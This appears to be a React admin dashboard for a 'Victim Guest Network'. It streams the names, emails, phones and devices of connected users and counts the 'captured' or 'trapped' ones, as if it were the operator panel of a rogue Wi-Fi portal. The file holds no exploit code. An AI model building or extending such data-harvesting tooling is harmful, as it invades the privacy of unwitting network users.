"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { createClient } from "@/lib/client"
import { getDeviceCategory, generateDeviceName } from "@/lib/device-detection"

type ConnectedUser = {
  id: string
  email: string
  phone: string
  name: string
  ip_address: string
  mac_address: string
  device_name: string
  user_agent: string
  connected_at: string
  accepted_terms: boolean
  terms_read_complete: boolean
  trapped: boolean
}

type Activity = {
  id: string
  user_id: string
  action_type: string
  setting_name: string
  enabled: boolean
  details: any
  created_at: string
}

export function AdminDashboard({
  users: initialUsers,
  activities: initialActivities,
  adminEmail,
}: {
  users: ConnectedUser[]
  activities: Activity[]
  adminEmail: string
}) {
  const [users, setUsers] = useState(initialUsers)
  const [activities, setActivities] = useState(initialActivities)
  const [currentTime, setCurrentTime] = useState(new Date())
  const router = useRouter()

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentTime(new Date())
    }, 1000)

    // Subscribe to real-time updates
    const supabase = createClient()
    const channel = supabase
      .channel("admin-updates")
      .on("postgres_changes", { event: "*", schema: "public", table: "connected_users" }, (payload) => {
        if (payload.eventType === "INSERT") {
          setUsers((prev) => [payload.new as ConnectedUser, ...prev])
        } else if (payload.eventType === "UPDATE") {
          setUsers((prev) => prev.map((u) => (u.id === payload.new.id ? (payload.new as ConnectedUser) : u)))
        } else if (payload.eventType === "DELETE") {
          setUsers((prev) => prev.filter((u) => u.id !== payload.old.id))
        }
      })
      .on("postgres_changes", { event: "INSERT", schema: "public", table: "activity_log" }, (payload) => {
        setActivities((prev) => [payload.new as Activity, ...prev].slice(0, 50))
      })
      .subscribe()

    return () => {
      clearInterval(timer)
      supabase.removeChannel(channel)
    }
  }, [])

  const handleLogout = async () => {
    const supabase = createClient()
    await supabase.auth.signOut()
    router.push("/admin/login")
    router.refresh()
  }

  const activeUsers = users.filter((u) => !u.trapped).length
  const trappedUsers = users.filter((u) => u.trapped).length
  const totalSessions = users.length
  const usersWhoReadTerms = users.filter((u) => u.terms_read_complete).length
  const termsReadPercentage = totalSessions > 0 ? Math.round((usersWhoReadTerms / totalSessions) * 100) : 0

  const formatTime = (dateString: string) => {
    const date = new Date(dateString)
    return date.toLocaleTimeString()
  }

  const formatDate = (dateString: string) => {
    const date = new Date(dateString)
    return date.toLocaleDateString()
  }

  return (
    <>
      <style jsx>{`
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .admin-container {
            width: 100%;
            max-width: 1200px;
            margin: 0 auto;
        }

        .admin-header {
            background-color: #0066b2;
            color: white;
            padding: 16px 24px;
            margin-bottom: 20px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .admin-title {
            font-size: 24px;
            font-weight: 600;
        }

        .admin-meta {
            display: flex;
            gap: 24px;
            font-size: 14px;
        }

        .meta-item {
            display: flex;
            flex-direction: column;
            gap: 4px;
        }

        .meta-label {
            opacity: 0.8;
            font-size: 12px;
            text-transform: uppercase;
            font-weight: 500;
        }

        .meta-value {
            font-weight: 600;
        }

        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 16px;
            margin-bottom: 32px;
        }

        .stat-card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .stat-header {
            background-color: #0066b2;
            color: white;
            padding: 12px 16px;
            font-size: 12px;
            font-weight: 500;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .stat-content {
            padding: 20px 16px;
        }

        .stat-value {
            font-size: 32px;
            font-weight: 300;
            color: #333;
        }

        .stat-subtext {
            font-size: 12px;
            color: #666;
            margin-top: 4px;
        }

        .content-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 24px;
        }

        .data-section {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }

        .section-header {
            background-color: #0066b2;
            color: white;
            padding: 16px;
            font-size: 16px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .section-content {
            padding: 20px;
        }

        .user-table {
            width: 100%;
            border-collapse: collapse;
        }

        .user-table th {
            text-align: left;
            padding: 12px;
            font-size: 12px;
            font-weight: 600;
            color: #666;
            text-transform: uppercase;
            border-bottom: 2px solid #e9ecef;
        }

        .user-table td {
            padding: 12px;
            border-bottom: 1px solid #e9ecef;
            font-size: 14px;
        }

        .user-status {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 12px;
            font-size: 11px;
            font-weight: 500;
            text-transform: uppercase;
        }

        .status-active {
            background-color: #d4edda;
            color: #155724;
        }

        .status-captured {
            background-color: #f8d7da;
            color: #721c24;
        }

        .status-terms-read {
            background-color: #d1ecf1;
            color: #0c5460;
        }

        .activity-list {
            max-height: 600px;
            overflow-y: auto;
        }

        .activity-item {
            border-left: 3px solid #0066b2;
            padding: 12px 0 12px 20px;
            margin-bottom: 16px;
            background-color: #f8f9fa;
            border-radius: 4px;
        }

        .activity-item:last-child {
            margin-bottom: 0;
        }

        .activity-header {
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
            margin-bottom: 8px;
        }

        .activity-type {
            font-size: 12px;
            font-weight: 600;
            color: #0066b2;
            text-transform: uppercase;
        }

        .activity-time {
            font-size: 11px;
            color: #666;
        }

        .activity-details {
            font-size: 13px;
            color: #555;
            line-height: 1.4;
        }

        .activity-details div {
            margin-bottom: 2px;
        }

        .btn-logout {
            background-color: #f44336;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 8px 16px;
            font-size: 12px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        .btn-logout:hover {
            background-color: #d32f2f;
        }

        .no-data {
            text-align: center;
            color: #666;
            font-size: 14px;
            padding: 40px;
        }

        .monitoring-indicator {
            position: fixed;
            bottom: 20px;
            left: 20px;
            background: white;
            padding: 8px 12px;
            border-radius: 20px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 12px;
            color: #666;
        }

        .pulse-dot {
            width: 8px;
            height: 8px;
            background-color: #4caf50;
            border-radius: 50%;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        @media (max-width: 768px) {
            .content-grid {
                grid-template-columns: 1fr;
            }

            .admin-meta {
                flex-direction: column;
                gap: 12px;
            }

            .stats-grid {
                grid-template-columns: 1fr;
            }
        }
      `}</style>

      <div className="body">
        <div className="admin-container">
          <div className="admin-header">
            <h1 className="admin-title">Admin Control Panel</h1>
            <div className="admin-meta">
              <div className="meta-item">
                <span className="meta-label">System</span>
                <span className="meta-value">Victim Guest Network</span>
              </div>
              <div className="meta-item">
                <span className="meta-label">Access Level</span>
                <span className="meta-value">Administrator</span>
              </div>
              <div className="meta-item">
                <span className="meta-label">Logged in as</span>
                <span className="meta-value">{adminEmail}</span>
              </div>
              <div className="meta-item">
                <span className="meta-label">Status</span>
                <span className="meta-value" style={{ color: '#4caf50' }}>✓ Operational</span>
              </div>
              <div className="meta-item">
                <span className="meta-label">System Time</span>
                <span className="meta-value" style={{ fontFamily: 'monospace' }}>{currentTime.toLocaleTimeString()}</span>
              </div>
              <button className="btn-logout" onClick={handleLogout}>
                Logout
              </button>
            </div>
          </div>

          <div className="stats-grid">
            <div className="stat-card">
              <div className="stat-header">Total Sessions</div>
              <div className="stat-content">
                <div className="stat-value">{totalSessions}</div>
              </div>
            </div>

            <div className="stat-card">
              <div className="stat-header">Active Users</div>
              <div className="stat-content">
                <div className="stat-value" style={{ color: '#4caf50' }}>{activeUsers}</div>
              </div>
            </div>

            <div className="stat-card">
              <div className="stat-header">Captured Users</div>
              <div className="stat-content">
                <div className="stat-value" style={{ color: '#f44336' }}>{trappedUsers}</div>
              </div>
            </div>

            <div className="stat-card">
              <div className="stat-header">Terms Read</div>
              <div className="stat-content">
                <div className="stat-value" style={{ color: '#2196f3' }}>{usersWhoReadTerms}</div>
                <div className="stat-subtext">{termsReadPercentage}% of users</div>
              </div>
            </div>

            <div className="stat-card">
              <div className="stat-header">Capture Rate</div>
              <div className="stat-content">
                <div className="stat-value">
                  {totalSessions > 0 ? Math.round((trappedUsers / totalSessions) * 100) : 0}%
                </div>
              </div>
            </div>
          </div>

          <div className="content-grid">
            <div className="data-section">
              <div className="section-header">
                Connected Users
              </div>
              <div className="section-content">
                <div style={{ maxHeight: '600px', overflowY: 'auto' }}>
                  {users.length === 0 ? (
                    <div className="no-data">No users connected yet</div>
                  ) : (
                    <table className="user-table">
                      <thead>
                        <tr>
                          <th>Name</th>
                          <th>Email</th>
                          <th>Status</th>
                          <th>Device</th>
                          <th>Connected</th>
                        </tr>
                      </thead>
                      <tbody>
                        {users.map((user) => (
                          <tr key={user.id}>
                            <td>{user.name || "Unknown"}</td>
                            <td>{user.email || "N/A"}</td>
                            <td>
                              <span className={`user-status ${user.trapped ? 'status-captured' : 'status-active'}`}>
                                {user.trapped ? 'Captured' : 'Active'}
                              </span>
                              {user.terms_read_complete && (
                                <span className="user-status status-terms-read" style={{ marginLeft: '4px' }}>
                                  Terms Read
                                </span>
                              )}
                            </td>
                            <td>{generateDeviceName(user.user_agent) || getDeviceCategory(user.user_agent) || "Unknown"}</td>
                            <td>
                              <div style={{ fontSize: '12px', color: '#666' }}>
                                {formatDate(user.connected_at)}
                              </div>
                              <div style={{ fontSize: '11px', color: '#999' }}>
                                {formatTime(user.connected_at)}
                              </div>
                            </td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  )}
                </div>
              </div>
            </div>

            <div className="data-section">
              <div className="section-header">
                Activity Log
              </div>
              <div className="section-content">
                <div className="activity-list">
                  {activities.length === 0 ? (
                    <div className="no-data">No activity logged yet</div>
                  ) : (
                    activities.map((activity) => (
                      <div key={activity.id} className="activity-item">
                        <div className="activity-header">
                          <span className="activity-type">{activity.action_type.replace('_', ' ').toUpperCase()}</span>
                          <span className="activity-time">{formatTime(activity.created_at)}</span>
                        </div>
                        <div className="activity-details">
                          {activity.details?.name && <div>Name: {activity.details.name}</div>}
                          {activity.details?.email && <div>Email: {activity.details.email}</div>}
                          {activity.details?.phone && <div>Phone: {activity.details.phone}</div>}
                          {activity.details?.device_name && <div>Device: {activity.details.device_name}</div>}
                          {activity.details?.terms_read_complete !== undefined && (
                            <div>
                              Terms Read: <span style={{
                                color: activity.details.terms_read_complete ? '#4caf50' : '#f44336',
                                fontWeight: 'bold'
                              }}>
                                {activity.details.terms_read_complete ? 'Yes' : 'No'}
                              </span>
                            </div>
                          )}
                        </div>
                      </div>
                    ))
                  )}
                </div>
              </div>
            </div>
          </div>

          <div className="monitoring-indicator">
            <div className="pulse-dot"></div>
            <span>Victim System Monitoring Active</span>
          </div>
        </div>
      </div>
    </>
  )
}
